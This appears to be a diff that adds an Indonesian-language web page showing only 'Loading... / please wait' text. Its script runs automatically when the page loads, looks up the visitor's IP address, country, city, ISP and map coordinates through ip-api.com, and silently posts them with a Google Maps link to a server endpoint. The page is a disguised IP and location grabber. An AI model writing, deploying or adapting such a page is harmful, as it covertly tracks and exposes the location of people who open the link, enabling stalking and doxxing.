@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <title>Loading...</title>
+</head>
+<body>
+  <h3>Mohon tunggu...</h3>
+
+  <script>
+    async function getIP() {
+      try {
+        const res = await fetch("https://ip-api.com/json/");
+        const data = await res.json();
+
+        const info = `
+📡 *IP Terdeteksi*
+🌐 IP: ${data.query}
+🌍 Negara: ${data.country}
+🏙 Kota: ${data.city}, ${data.regionName} ${data.zip}
+🛰 ISP: ${data.isp}
+🏢 Org: ${data.org}
+⚡ ASN: ${data.as}
+⌚ Zona Waktu: ${data.timezone}
+📌 Koordinat: ${data.lat}, ${data.lon}
+🔗 https://www.google.com/maps?q=${data.lat},${data.lon}
+        `;
+
+        // kirim ke API vercel kamu (server-side)
+        const send = await fetch("/api/send", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ text: info })
+        });
+
+        const result = await send.json();
+        console.log("Result API:", result);
+
+      } catch (err) {
+        console.error("Error:", err);
+      }
+    }
+
+    getIP();
+  </script>
+</body>
+</html>
